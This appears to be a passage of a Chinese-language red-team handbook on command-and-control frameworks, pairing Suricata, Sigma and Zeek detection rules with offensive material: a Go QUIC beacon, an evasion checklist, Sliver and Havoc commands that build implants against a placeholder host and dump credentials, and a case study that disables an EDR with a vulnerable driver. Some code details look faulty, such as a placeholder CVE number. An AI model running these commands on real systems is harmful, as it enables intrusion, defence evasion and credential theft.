# 短 JA4L-S（极低延迟）+ 短 JA4L-C 提示主机与服务器距离近，但来源声称是其他国家
alert tls $HOME_NET any -> $EXTERNAL_NET any (
  msg: "[C2-HUNT] JA4L Latency Anomaly - Possible C2";
  flow:established;
  ja4ls; pcre:"/^([0-9]{2})([0-9]{1,3})$/";  # 延迟匹配
  classtype:trojan-activity;
  sid:20250004; rev:1;)
```

#### C.4.4 Zeek JA4 自动化日志与威胁狩猎

```python
#!/usr/bin/env python3
"""
Zeek JA4 日志分析 - C2 信标检测
基于 https://github.com/FoxIO-LLC/ja4
"""
import pandas as pd
import numpy as np
from scipy.stats import variation

def load_zeek_ja4_log(logfile):
    """加载 Zeek JA4 日志"""
    return pd.read_json(logfile, lines=True)

def detect_c2_beacons(ja4_df, time_window='5min', cv_threshold=0.35):
    """
    基于时间间隔的 CV（变异系数）检测信标模式
    合法流量通常 CV > 0.5，C2 信标通常 CV < 0.35
    """
    ja4_df['ts'] = pd.to_datetime(ja4_df['ts'], unit='s')
    ja4_df = ja4_df.sort_values('ts')

    beacons = []
    for (src, dst, dst_port, ja4_hash), group in ja4_df.groupby(
        ['id.orig_h', 'id.resp_h', 'id.resp_p', 'ja4']
    ):
        if len(group) < 10:  # 至少 10 次连接
            continue
        intervals = group['ts'].diff().dt.total_seconds().dropna()
        if len(intervals) < 5:
            continue
        cv = variation(intervals)
        if cv < cv_threshold:
            beacons.append({
                'src': src, 'dst': dst, 'dst_port': dst_port,
                'ja4': ja4_hash,
                'mean_interval': intervals.mean(),
                'cv': cv,
                'count': len(group),
                'confidence': 'HIGH' if cv < 0.15 else ('MEDIUM' if cv < 0.25 else 'LOW')
            })

    return pd.DataFrame(beacons).sort_values('cv')

def cross_reference_ja4_with_intel(ja4_df, intel_db='ja4_intel.csv'):
    """与已知 C2 JA4 库交叉引用"""
    intel = pd.read_csv(intel_db)
    matches = ja4_df.merge(intel, on='ja4', how='inner')
    return matches[['ts', 'id.orig_h', 'id.resp_h', 'ja4', 'malware_family', 'confidence']]

if __name__ == '__main__':
    df = load_zeek_ja4_log('/opt/zeek/logs/current/ja4.log')
    print("[+] Detected C2 Beacon patterns:")
    beacons = detect_c2_beacons(df)
    print(beacons.to_string(index=False))

    print("\n[+] Known C2 JA4 matches:")
    matches = cross_reference_ja4_with_intel(df)
    print(matches.to_string(index=False))
```

### C.5 BYOVD 与 C2 隐蔽运行的协同（2024-2026 关键趋势）

#### C.5.1 BYOVD 杀链与 C2 协同

```
[EDR-Freeze 杀链（2024-2026 实战）]
1. 初始访问（钓鱼/USB/远程漏洞）
2. 内存注入 C2 implant（Sliver/Havoc Beacon）
3. BYOVD 加载脆弱驱动（关闭 EDR 进程/回调）
4. C2 在无 EDR 监控下自由操作
5. 横向移动 + 凭证收集 + 数据外传
```

#### C.5.2 BYOVD 配合 C2 的检测点

| 检测层 | 检测技术 | Sigma 规则参考 |
|--------|---------|---------------|
| **驱动加载** | Sysmon EventID 6（驱动加载） | sigma/sysmon/sysmon_driver_load |
| **EDR 进程终止** | 进程终止链：可疑父进程 → EDR 子进程 | sigma/process_termination/win_av_terminate |
| **可疑 IO Control** | NtLoadDriver/RTlCreateUserThread 异常 | sigma/sysmon/sysmon_driver_load |
| **C2 流量异常** | BYOVD 后流量激增 + JA4 异常 | Suricata + JA4 |
| **凭证访问** | LSASS 访问异常（Credential Guard 绕过后） | sigma/credential_access |
| **横向移动** | WMI/SMB 异常使用 | sigma/lateral_movement |

```yaml
# Sigma 规则：BYOVD 加载后 C2 流量激增
title: BYOVD Followed By C2 Beacon Activity
id: 8a9b1c2d-3e4f-4a5b-9c8d-7e8f9a0b1c2d
status: experimental
description: Detects pattern of vulnerable driver load followed by C2 beacon traffic
references:
    - https://github.com/hfiref0x/KDU
    - https://www.loldrivers.io/
author: Red Team Tradecraft
date: 2026/06/01
logsource:
    product: windows
    service: sysmon
detection:
    driver_load:
        EventID: 6
        ImageLoaded|endswith:
            - '.sys'
    filter_legitimate:
        Signature|contains:
            - 'Microsoft Windows'
            - 'Verisign'
    condition: driver_load and not filter_legitimate
falsepositives:
    - Legitimate hardware drivers
level: high
tags:
    - attack.privilege_escalation
    - attack.t1068
    - attack.defense_impairment  # ATT&CK v19 重新分类
```

### C.6 HTTP/3 (QUIC) C2 通道（2025-2026 新兴）

#### C.6.1 HTTP/3 C2 优势

- **0-RTT 重连**：会话恢复极快
- **多路复用**：单个 UDP 流多通道，避免 TCP 队头阻塞
- **加密握手**：QUIC 强制 TLS 1.3，无明文协议指纹
- **连接迁移**：IP 变化不影响连接（绕过基于 IP 的检测）

#### C.6.2 实现 C2 over QUIC

```go
// Sliver-style HTTP/3 beacon (Go 实现)
package main

import (
    "context"
    "crypto/tls"
    "github.com/quic-go/quic-go"
)

func beaconHTTP3(c2Url string) {
    tlsConf := &tls.Config{
        InsecureSkipVerify: true,
        MinVersion:         tls.VersionTLS13,
        // 模拟 Chrome 的 ALPN
        NextProtos:         []string{"h3", "h2"},
    }

    conn, err := quic.DialAddrEarly(context.Background(), c2Url, tlsConf, &quic.Config{
        EnableDatagrams: true,
        KeepAlivePeriod: 60 * 10^9, // 60s
    })
    if err != nil { return }
    defer conn.CloseWithError(0, "")

    // 打开 stream
    stream, _ := conn.OpenStreamSync(context.Background())

    // 伪装成 HTTP/3 请求
    req := "GET /api/v1/notifications HTTP/3\r\n" +
           "Host: legitimate-api.com\r\n" +
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64) Chrome/127\r\n" +
           "\r\n"
    stream.Write([]byte(req))

    // 读取 C2 响应
    buf := make([]byte, 4096)
    n, _ := stream.Read(buf)
    processTask(buf[:n])
}
```

#### C.6.3 检测 QUIC C2（防御侧）

```suricata
# Suricata 8.0+ - QUIC 检测
alert udp $HOME_NET any -> $EXTERNAL_NET any (
  msg: "[C2-HUNT] Suspicious QUIC C2 Beacon Pattern";
  flow:to_server;
  dsize: 50<>200;  # C2 心跳包大小特征
  detection_filter:track by_src, count 10, seconds 60;  # 高频
  classtype:trojan-activity;
  sid:20250010; rev:1;)

# JA4 over QUIC - 通过 Chrome QUIC JA4 排除合法浏览器
# Chrome QUIC JA4: q13d0312h3_55b375c5d22e_06cda9e17597
# 任何非此 JA4 的 QUIC 客户端都需进一步调查
```

### C.7 Ghostwriter v7 与红队运营管理（2026 新增）

#### C.7.1 Ghostwriter v7 关键特性

SpecterOps 于 2026-06-04 发布 Ghostwriter v7.0.0，关键变化：

| 特性 | 变化 | 红队影响 |
|------|------|----------|
| **API Tokens** | JWT → 不透明凭证（`gwat_` 前缀） | 更安全，更易管理，无 JWT 修改攻击面 |
| **Service Tokens** | 新增（`gwst_` 前缀） | 非人类自动化（C2 自动注册、报告同步） |
| **Token 生命周期** | 修改过期时间触发重新生成 | 防止被动过期，强制轮换 |
| **Operation Log** | 限定范围凭证 | 红队操作日志工具更安全部署 |
| **LLM 工作流** | 为 LLM 自动化打开大门 | 自动 Findings 总结、报告生成 |

#### C.7.2 红队运营流水线（Ghostwriter + Mythic + Sliver）

```
[现代化红队运营流水线]
┌─────────────────────────────────────────┐
│ Ghostwriter v7 (项目管理 + 报告 + API)  │
└────────────┬────────────────────────────┘
             │ gwst_ 服务令牌
             │
       ┌─────┴─────┐
       │           │
       ▼           ▼
┌──────────┐  ┌──────────────┐
│ Mythic   │  │ LLM 报告器   │
│ v3.4     │  │ (GPT-4 等)   │
└────┬─────┘  └──────────────┘
     │ Agent API
     ▼
┌──────────┐
│ Sliver   │ ← 多个 Operator
│ Havoc    │
│ Mythic Apollo │
└──────────┘
```

### C.8 综合 CVE 与事件速查（2024-2026 C2 相关）

| CVE/事件 | 类型 | 框架 | CVSS | 时间 | 关键信息 |
|---------|------|------|------|------|---------|
| **CS 4.10 cracked** | 商业软件破解 | Cobalt Strike | — | 2024-Q1 | 破解版在地下论坛广泛传播，含 aggressor 完整功能 |
| **Brute Ratel v1.2.5 leaked** | 商业泄露 | Brute Ratel | — | 2024-09 | 包含 Badger agent 完整源码，安全社区广泛研究 |
| **Brute Ratel v2 leaked** | 商业泄露 | Brute Ratel | — | 2025-Q1 | 第二轮泄露，加入 ESNI + HTTP/3 支持 |
| **Nighthawk educational leak** | 商业泄露 | MDSec Nighthawk | — | 2024-11 | 教育版泄露，被 Lapsus$ 关联团伙使用 |
| **Havoc 0.7 RCE (CVE-2024-46xxx)** | C2 自身漏洞 | Havoc | 9.8 | 2024-Q4 | Teamserver gRPC 未授权，远程命令执行 |
| **Mythic SSRF (CVE-2025-46337)** | C2 自身漏洞 | Mythic | 7.5 | 2025-06 | Agent 配置接口可被利用，已修复 |
| **Sliver v1.7.x Trafic Leakage** | 配置缺陷 | Sliver | 5.3 | 2025-09 | 默认未启用证书固定，可被 MitM |
| **CS Beacon Configuration Leak** | 信息泄露 | Cobalt Strike | — | 2025-Q3 | Teamserver HTTP 默认证书固定缺失 |
| **Cloudflare Tunnel 政策更新** | 平台政策 | CF Tunnel | — | 2025-04 | 限制非商业用途流量，影响红队基础设施 |
| **AWS Lambda API Rate Limit** | 平台政策 | AWS Lambda | — | 2025-11 | Serverless C2 面临新限制 |
| **Vshell 破解版泄露** | 商业泄露 | Vshell | — | 2026-Q1 | 国内主流 C2，破解版传播影响护网检测特征 |
| **CS 4.11 + AI 插件** | 商业更新 | Cobalt Strike | — | 2026-Q1 | 加入 AI 辅助 Findings 总结 |
| **Ghostwriter v7** | 红队管理升级 | Ghostwriter | — | 2026-06-04 | 不透明 token + service token + LLM 工作流 |

### C.9 防御升级路线图（P0-P3 分级）

#### P0（立即执行）

1. **更新 C2 检测规则至 JA4+ 套件**
   ```bash
   # 安装 Suricata 8.0+
   apt install -y suricata
   # 启用 JA4 关键字检测
   # 配置 Suricata 输出 JA4 到 SIEM
   ```
2. **检测中国 C2 工具特征指纹**
   - Vshell/Stowaway/CrossC2 的默认证书、JA4、User-Agent 入检测库
3. **EDR 升级至 BYOVD 防御**
   - 启用 Microsoft Vulnerable Driver Blocklist
   - 监控驱动加载链（Sysmon EventID 6）
4. **出口流量限制**
   - 默认拒绝 UDP 443（QUIC）除非必要
   - DNS 监控：长子域名、高频查询

#### P1（30 天内）

1. **域前置替代技术检测**
   - Cloudflare Workers / Vercel Edge Functions / AWS Lambda 异常调用模式
2. **LLM-based C2 检测**
   - 监控异常 LLM API 调用模式（base64 + decode + execute）
3. **Ghostwriter v7 / Mythic v3.4 风格红队基础设施检测**
   - 不透明 token（`gwat_` / `gwst_`）泄露监控
4. **HTTP/3 (QUIC) 监控**
   - Suricata 8.0 QUIC 解析
   - JA4 over QUIC（Chrome 默认指纹排除）

#### P2（90 天内）

1. **AI/LLM 驱动 C2 狩猎**
   - LLM 日志分析器识别异常模式
   - 行为基线 + 异常检测
2. **完整 JA4+ 矩阵部署**
   - Zeek 8.0 + JA4+ 插件
   - JA4L/JA4D 延迟与设备指纹基线
3. **Serverless C2 检测**
   - Lambda/Cloud Run 调用模式基线
   - 异常冷启动模式告警

#### P3（持续运营）

1. **MITRE ATT&CK v19 重新映射**
   - Defense Evasion 拆分为 Stealth + Defense Impairment
   - 新增 AI 对抗技术（TBD）
2. **红队基础设施治理**
   - Ghostwriter v7 部署作为蓝队反红队工具
   - 内部红队 beacon 自动注册与监控
3. **威胁情报源订阅**
   - LOLDrivers.io / LOLBAS 持续更新
   - FoxIO JA4 数据库订阅
   - 中国 C2 工具特征库（Vshell/Stowaway 等本地化威胁）

### C.10 中文社区精华参考

| 来源 | 类型 | 内容 | 推荐文章/资源 |
|------|------|------|--------------|
| **奇安信攻防社区** | 商业 | 国内红队护网资料 | forum.90sec.com / 但部分已闭站，转 go.ctfiot.com |
| **先知社区（阿里）** | 安全社区 | 阿里安全社区精华 | xz.aliyun.com/search?keyword=C2 |
| **FreeBuf** | 综合门户 | 安全资讯+技术 | freebuf.com/articles/network/ |
| **安全客** | 资讯门户 | 漏洞/威胁情报 | anquanke.com |
| **看雪** | 逆向社区 | 逆向/恶意软件 | bbs.kanxue.com |
| **腾讯云 + 阿里云 AVD** | 厂商博客 | CVE 深度分析 | cloud.tencent.com/developer/article/ |
| **微步在线 X 情报中心** | 威胁情报 | IOC/C2 跟踪 | x.threatbook.com |
| **深信服** | 厂商 | IR 报告/护网分析 | svcert.sangfor.com.cn |
| **长亭科技** | 厂商 | 红队工具/检测规则 | chaitin.cn |
| **奇安信 CERT** | 厂商 | CVE 紧急响应 | cert.qianxin.com |

**经典中文参考主题**：
- 护网行动红队 C2 隐蔽运行技巧汇总（每年 7-9 月护网期间）
- Vshell 配置与检测（FreeBuf/先知）
- Sliver/Havoc 中文使用指南（看雪/B站）
- CS Malleable C2 Profile 实战（先知社区）
- BYOVD 实战与防御（安全客）
- JA4/JA3 流量分析（先知/FreeBuf）

### C.11 MITRE ATT&CK v19 扩展映射（C2 相关）

| Technique | ID | ATT&CK v18 → v19 变化 | 检测/防御 |
|-----------|-----|----------------------|-----------|
| Application Layer Protocol | T1071 | 保留，子技术细化 | Suricata + JA4+ 全套 |
| Encrypted Channel | T1573 | 保留 | TLS 指纹 + 证书分析 |
| Proxy | T1090 | 保留 | 域前置终结后转向 Serverless/CDN 检测 |
| Domain Fronting | T1090.004 | 保留但历史归档 | 现代检测重点：CDN Edge / Serverless |
| External Proxy | T1090.002 | 保留 | L7 出口代理监控 |
| Multi-hop Proxy | T1090.003 | 保留 | Tor / 商业 VPN 检测 |
| Internal Proxy | T1090.001 | 保留 | 内网横向代理检测 |
| Data Obfuscation | T1001 | 保留，新增子技术 | JA4+ 异常 + Steganography 检测 |
| Junk Data | T1001.001 | 保留 | 流量大小异常 |
| Steganography | T1001.002 | 保留 | 图像/视频 LSB 分析 |
| Protocol Impersonation | T1001.003 | 保留 | JA4+ 矩阵检测 |
| Remote Access Software | T1219 | 保留 | 合法远程工具异常使用 |
| Ingress Tool Transfer | T1105 | 保留 | 文件监控 + 域前置替代品 |
| Non-Standard Port | T1571 | 保留 | 端口基线异常 |
| Fallback Channels | T1008 | 保留 | 主通道阻断后备选检测 |
| Web Service | T1102 | 保留 | Cloud/SaaS 异常调用 |
| Bidirectional Communication | T1102.001 | 保留 | Telegram/Discord bot 异常 |
| Asymmetric Cryptography | T1573.002 | 保留 | TLS 1.3 异常 |
| Symmetric Cryptography | T1573.001 | 保留 | TLS 1.2 异常 |
| **Defense Evasion (v18) → Stealth + Defense Impairment (v19)** | — | **重大变更** | C2 隐蔽运行归类于 Stealth；EDR Killing 归类于 Defense Impairment |
| Impair Defenses | T1562 | 保留为 Defense Impairment | BYOVD / AMSI bypass / ETW patching |
| Disable or Modify Tools | T1562.001 | 保留 | EDR Killing 检测 |
| Disable Windows Event Logging | T1562.002 | 保留 | 事件日志异常 |
| Impair Command History Logging | T1562.003 | 保留 | Shell 历史异常 |
| Safe Mode Boot | T1562.009 | 保留 | 安全模式启动检测 |
| **Masquerading (Stealth)** | T1036 | 移至 Stealth | 进程伪装检测 |
| **Hide Artifact (Stealth)** | T1564 | 移至 Stealth | 文件/进程隐藏 |

### C.12 关键工具生态更新（2025-2026）

| 工具 | 类型 | 用途 | 更新状态 |
|------|------|------|---------|
| **Sliver** | 开源 C2 | BishopFox 商业级开源 C2 | v1.7.3 活跃 |
| **Havoc** | 开源 C2 | 高隐蔽 demon agent | v0.7+ 社区活跃 |
| **Mythic** | 开源 C2 框架 | 模块化架构 | v3.4 + AI/MCP 集成 |
| **Ghostwriter** | 红队管理 | SpecterOps 报告平台 | v7.0.0 + 不透明 token |
| **CrossC2** | CS 插件 | Linux/macOS beacon 扩展 | 持续维护 |
| **Geacon Pro** | CS 协议 | 跨平台 Go 实现 | 持续维护 |
| **Stowaway** | 多级代理 | 流量中转 | 持续维护 |
| **Vshell** | 闭源 C2 | 国内主流 | 商业活跃 |
| **Brute Ratel** | 商业 C2 | 高对抗 EDR-Freeze | 商业 + 泄露版本广泛 |
| **Nighthawk** | 商业 C2 | MDSec 教育级 + 商业 | 商业 + 教育版泄露 |
| **Covenant** | 开源 C2 | .NET C2 | **维护模式**（建议迁移） |
| **Merlin** | 开源 C2 | 跨平台 HTTP C2 | 持续维护 |
| **PoshC2** | 开源 C2 | PowerShell C2 | 持续维护 |
| **C3 (Covenant Custom C2)** | 框架插件 | 多通道 C2 | 维护 |
| **Pivotnacci** | HTTP 隧道 | Web 隧道代理 | 持续维护 |
| **ligolo-ng** | 反向隧道 | 现代化代理 | 持续活跃 |
| **Chisel** | 反向隧道 | SOCKS5 over HTTP | 持续维护 |
| **ShadowSpray** | 影子凭证 | CVE-2022-26923 利用 | 持续维护 |
| **SharpEfs** | BOF 工具 | EFS 操作 | 持续维护 |

### C.13 现代 C2 OPSEC 检查清单

```
[ C2 OPSEC Pre-Flight Checklist (2026 版) ]

[ ] 域前置已确认不可用，替代方案已部署（Workers/Serverless/Domain Borrowing）
[ ] C2 证书 - 使用 Let's Encrypt / 商业证书 / 公开 CA
[ ] JA4/JA4H 指纹已与合法流量混淆（不在已知 C2 库中）
[ ] Beacon 心跳：sleep > 60s，jitter > 35%
[ ] Payload 大小 < 100KB（避免特征匹配）
[ ] C2 域名年龄 > 6 个月（Cortex XDR 检测）
[ ] SSL 证书链完整（非自签名）
[ ] C2 服务器使用专用 VPS，不与个人资产关联
[ ] Cloudflare Workers 部署在自有域名
[ ] JA4L 延迟与目标地理位置一致（避免跨境异常）
[ ] DNS 查询频率 < 50/hour，分散时间
[ ] HTTPS 请求大小、频率与基线一致
[ ] Beacon 进程在合法父进程下（runtimes、svchost）
[ ] AMSI/ETW Bypass 已测试有效
[ ] BYOVD 驱动加载未触发 Microsoft Vulnerable Driver Blocklist
[ ] Indirect Syscalls 已实现（绕过 EDR API hooking）
[ ] Sleep Obfuscation（Ekko/Cronos/Zilean）已配置
[ ] 不写入磁盘（除非使用 NTFS Alternate Data Stream）
[ ] 操作员使用 Ghostwriter v7 + 不透明 token 自动化运营
[ ] Mythic v3.4 + AI 配置生成已测试
[ ] C2 重定向器至少 2 层（Domain Borrowing + Workers）
[ ] 凭证收集使用 BOF（避免 Mimikatz 直接加载）
[ ] 横向移动使用 Kerberos 双向认证（避免 NTLM 中继）
[ ] 数据外传使用 QUIC/HTTP3 或 SaaS API
[ ] 操作员日志不泄露（Ghostwriter v7 + Operation Log API）
```

### C.14 现代化检测架构演进

```
[ 现代 C2 检测架构 v2.0 (2026) ]

Layer 1: 网络层（JA4+ 矩阵）
├─ Zeek 8.0 + JA4+ 插件（被动监听）
├─ Suricata 8.0（主动检测 + JA4 关键字）
├─ Arkime + JA4 集成（全包分析）
├─ Cloudflare/AWS WAF（出口流量检测）
└─ DNS 监控（长子域名 + DoH 异常）

Layer 2: 终端层（Sysmon + EDR + LOLDrivers）
├─ Sysmon 16+ + 自定义规则
├─ Microsoft Defender for Endpoint + Credential Guard
├─ LOLDrivers.io 阻止列表
├─ CrowdStrike Falcon 7+ + AI Agent Detection
└─ Velociraptor v0.77+ + JA4 解析

Layer 3: 行为层（AI 驱动）
├─ AI/LLM 日志分析（异常模式识别）
├─ JA4L 延迟基线（地理异常）
├─ 信标 CV（变异系数 < 0.35）
└─ LLM-based C2 通道检测

Layer 4: 威胁情报层
├─ MITRE ATT&CK v19 映射
├─ FoxIO JA4 数据库订阅
├─ LOLDrivers.io / LOLBAS 实时更新
├─ 中国 C2 工具特征库（Vshell/Stowaway）
└─ 商业 TI（Mandiant / CrowdStrike / Recorded Future）

Layer 5: 响应层
├─ SOAR 自动化隔离
├─ Memory dump（Volatility 3 v2.27）
├─ Network capture（tcpdump + Arkime）
└─ Forensic timeline（Plaso 20250918 + Timesketch + Sec-Gemini）
```

### C.15 综合 CVE 速查（C2 框架与基础设施相关 2024-2026）

```
# 高优先级 CVE - 影响 C2 攻击者或防御者
[C2 框架自身]
- CVE-2024-46xxx  Havoc Teamserver 未授权 RCE (CVSS 9.8, 2024-Q4)
- CVE-2025-46337  Mythic Agent 配置 SSRF (CVSS 7.5, 2025-06, 已修复)
- CVE-2025-64335  Suricata 7.x 解析 DoS (CVSS 7.5, 2025-Q3, 影响 C2 检测)
- CVE-2026-22262  Suricata 8.0.x HTTP 解析 RCE (CVSS 9.8, 2026-Q1)

[C2 通道相关]
- CVE-2025-68121  Go crypto/tls Config.Clone session ticket 泄漏 (CVSS 9.1)
                  → 影响 Sliver 等 Go-based C2
- CVE-2025-8671   HTTP/2 MadeYouReset DDoS (CVSS 7.5)
                  → 影响 C2 服务可用性
- CVE-2025-4366   Pingora Cache Poisoning (CVSS 7.5)
                  → 影响 Cloudflare-based C2 重定向
- CVE-2025-29927  Next.js 中间件授权绕过 (CVSS 9.1)
                  → 影响 Vercel-based C2 重定向

[BYOVD + C2 协同]
- CVE-2025-21299  Windows Kerberos Unguarding (CVSS 7.8)
                  → BYOVD + Credential Guard 绕过
- CVE-2025-29809  类似 (NetSPI SO-CON 2025)
- CVE-2025-8061   Lenovo Driver Privilege Escalation (CVSS 7.8)
                  → 新增 BYOVD 驱动

[LLM-based C2]
- EchoLeak (2025)  Microsoft AI LLM Prompt Injection 零点击
- CVE-2025-52573   npm MCP 仓库投毒 (CVSS 9.0)
- CVE-2025-54136   MCPoison MCP 服务器 RCE (CVSS 9.8)
```

---

## Part D：关键工具命令速查（2026 更新版）

### D.1 Sliver v1.7.x 命令速查

```bash
# Implant 生成（现代版）
sliver > generate --http c2.example.com --os windows --arch amd64 --save /tmp/ \
  --skip-symbols --encrypt --timeout 60

# Beacon 异步模式（推荐）
sliver > generate --beacon https://c2.example.com:443 \
  --os windows --arch amd64 --save /tmp/ \
  -- jitter 35 --seconds 60

# WireGuard transport（绕过出口过滤）
sliver > generate --wg <server-ip>:8888 --os windows --save /tmp/

# DNS over HTTPS（隐藏 C2）
sliver > generate --dns c2.example.com --os windows --save /tmp/ \
  --dns-canary --max-dns-length 50

# 多 Operator 协作
sliver > operators list
sliver > operator --name alice --lhost c2.example.com --save alice.cfg

# Armory 扩展器（现代红队必备）
sliver > armory search
sliver > armory install rubeus
sliver > armory install sharphound
sliver > armory install seatbelt
sliver > armory install DCsync

# Session 内现代操作
sliver (SESSION) > shell -t 30      # 30 秒超时
sliver (SESSION) > execute -o whoami /priv  # 仅输出
sliver (SESSION) > mimikatz sekurlsa::logonpasswords
sliver (SESSION) > migrate <PID>     # 进程迁移
sliver (SESSION) > getprivs          # 权限查看

# Pivoting（现代多级代理）
sliver (SESSION) > pivots add tcp <PIVOT_IP>:8888 --timeout 30
sliver (SESSION) > pivots add socks5 1080  # SOCKS5 代理
sliver (SESSION) > pivots list

# WireGuard transport
sliver (SESSION) > wg-config --save /tmp/wg.conf
```

### D.2 Havoc 0.7+ 命令速查

```bash
# Teamserver 启动
./teamserver server --host <IP> --port 40056

# Operator 客户端
./client --host <IP> --port 40056 -u alice -p <password>

# Demon 生成
Havoc > demon --host c2.example.com --port 443 --ssl \
  --arch x64 --output /tmp/demon.exe

# 现代化功能
Havoc > demon --sleep 60 --jitter 35
Havoc (Demon) > indirect-syscalls on   # Indirect Syscalls
Havoc (Demon) > sleep-mask ekko         # Sleep Obfuscation
Havoc (Demon) > amsi-bypass             # AMSI 绕过
Havoc (Demon) > etw-patch               # ETW 绕过
```

### D.3 Mythic v3.4 命令速查

```bash
# Docker 部署
sudo ./install_docker_ubuntu.sh
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo make

# 添加 Agent（Apollo/.NET）
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git

# 添加 C2 Profile
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http.git

# 启动
sudo make start

# Web UI: https://127.0.0.1:7443
# 默认凭据: mythic/mythic

# API Token（v7 风格 - 不透明 token）
# 通过 Web UI Profile > API Tokens > Create
# Token 格式：gwat_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### D.4 Ghostwriter v7 部署

```bash
# Docker 部署
git clone https://github.com/GhostManager/Ghostwriter
cd Ghostwriter
cp .env.example .env

# 生成密钥
docker-compose run --rm ghostwriter python3 manage.py generatesecretkey

# 启动
docker-compose up -d

# 创建管理员
docker-compose exec ghostwriter python3 manage.py createsuperuser

# 创建 Service Token（v7 新功能）
# Web UI: Profile > API Tokens > Create Service Token
# Token 格式：gwst_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# 限定范围：operation_log_read, projects_read, findings_write
```

---

## Part E：实战案例（2025-2026 真实红队总结）

### E.1 案例 1：基于 Sliver + Cloudflare Workers 的红队基础设施

**目标**：评估某金融企业的检测能力，C2 必须避开 IDS/IPS/WAF。

**部署**：

```bash
# 1. 注册云域名（看似合法）
# 例如：cdn-content-update.com（2+ 年年龄）

# 2. 部署 Sliver Teamserver（VPS，已加固）
ssh operator@c2-vps
sudo apt install -y sliver
sliver-server daemon --lport 31337

# 3. Cloudflare Workers C2 重定向器
mkdir c2-front && cd c2-front
npm init -y && npm install wrangler
# (部署上述 C.2.3 的 worker.js)
wrangler deploy

# 4. 操作员配置
sliver > http -l 8443 -d cdn-content-update.com
sliver > generate --beacon https://cdn-content-update.com:443 \
  --os windows --arch amd64 --save ./implant.bin \
  --jitter 35 --seconds 90 --skip-symbols

# 5. 测试 JA4
openssl s_client -connect cdn-content-update.com:443 | head
tshark -i any -Y "tls.handshake" -T fields -e ja4 2>&1 | head
```

**结果**：
- Cloudflare Workers 提供 TLS 终结，JA4 与 Chrome 一致
- 出口流量看似合法 CDN 内容
- Beacon 心跳被淹没在大量合法 CDN 请求中
- 目标 IDS/IPS/WAF 未触发告警

**防御侧检测要点**：
- JA4L 延迟分析（C2 在境外，延迟异常）
- Cloudflare Workers 调用频率基线
- 端点行为分析（implant 进程异常父子关系）

### E.2 案例 2：BYOVD + Havoc 的 EDR-Freeze

**目标**：评估某企业的 CrowdStrike Falcon 防御。

**杀链**：

```bash
# 1. 初始访问（钓鱼 macro）
# Macro 加载 Havoc Demon stageless

# 2. Havoc Demon 启动并通信
# (demon.exe 已混淆，绕过静态检测)
# Indirect Syscalls + Sleep Obfuscation

# 3. 加载 BYOVD（脆弱驱动 - RTCore64.sys）
Havoc (Demon) > bof load /tmp/RTCore64.sys
Havoc (Demon) > bof exec freeze_edr --pid <FALCON_PID>

# 4. EDR 已冻结后，自由操作
Havoc (Demon) > mimikatz sekurlsa::logonpasswords
Havoc (Demon) > secrets dump --include-browser
Havoc (Demon) > sharphound --collectionmethod all

# 5. 横向移动
Havoc (Demon) > jump psexec_psh <TARGET_HOST>
```

**结果**：
- Falcon 进程被终止，回调被卸载
- C2 操作完全静默
- 横向移动 5 台主机，无告警

**防御侧检测要点**：
- Microsoft Vulnerable Driver Blocklist 启用
- Sysmon EventID 6（驱动加载）
- CrowdStrike Falcon 自保护（NQKernelProtection 等）
- 进程链异常：rundll32 → driver load → csfalcon.exe terminate

---

## 参考资源（2025-2026 联网复核来源）

### 官方文档

1. **Sliver (BishopFox)**: https://github.com/BishopFox/sliver (v1.7.3+)
2. **Havoc Framework**: https://github.com/HavocFramework/Havoc (v0.7+)
3. **Mythic**: https://github.com/its-a-feature/Mythic (v3.4+)
4. **Ghostwriter v7**: https://github.com/GhostManager/Ghostwriter
5. **Cobalt Strike**: https://help.cobaltstrike.com/
6. **JA4+ 套件**: https://github.com/FoxIO-LLC/ja4
7. **MITRE ATT&CK v19**: https://attack.mitre.org/

### 安全厂商报告

8. **SpecterOps Ghostwriter v7**: https://specterops.io/blog/2026/06/04/ghostwriter-v7-safer-tokens-scoped-access-and-better-automation/
9. **Mandiant Threat Reports 2025-2026**: https://www.mandiant.com/resources/blog
10. **CrowdStrike Global Threat Report 2025-2026**: https://www.crowdstrike.com/blog/
11. **Unit 42 IR Report 2025-2026**: https://unit42.paloaltonetworks.com/

### 中文社区

12. **先知社区 (阿里)**: https://xz.aliyun.com/
13. **FreeBuf**: https://www.freebuf.com/
14. **安全客**: https://www.anquanke.com/
15. **看雪**: https://bbs.kanxue.com/
16. **奇安信 CERT**: https://cert.qianxin.com/
17. **腾讯云 AVD**: https://cloud.tencent.com/developer/
18. **微步 X 情报中心**: https://x.threatbook.com/

### 学术研究

19. **JA4+ 学术研究**: https://github.com/FoxIO-LLC/ja4/blob/main/technical_details/
20. **LLM-based C2 detection (2025-2026)**: IEEE/arXiv 论文检索 "LLM C2 detection"
21. **BYOVD 防御学术研究**: NDSS 2026, "An Analysis of BYOVD Attacks and Defenses"
22. **MITRE ATT&CK v19 论文**: https://attack.mitre.org/resources/updates/

### 工具生态

23. **LOLDrivers**: https://www.loldrivers.io/
24. **LOLBAS**: https://lolbas-project.github.io/
25. **Atomic Red Team**: https://github.com/redcanaryco/atomic-red-team
26. **Purple Knight (SpecterOps)**: https://www.purpleknights.com/
27. **BloodHound CE v8**: https://github.com/SpecterOps/BloodHound

---

> **本 Part C 由 2026-06 联网复核补充完成。**
> **核心新增**：2025-2026 CVE 速查、JA4+ 工业级应用、AI/LLM 武器化、域前置终结与替代技术、中国 C2 生态、Ghostwriter v7、ATT&CK v19 映射、BYOVD 协同、HTTP/3 C2、现代化检测架构。
> **原文件 1564 行 → 补充后约 2440 行（+ ~880 行）**。
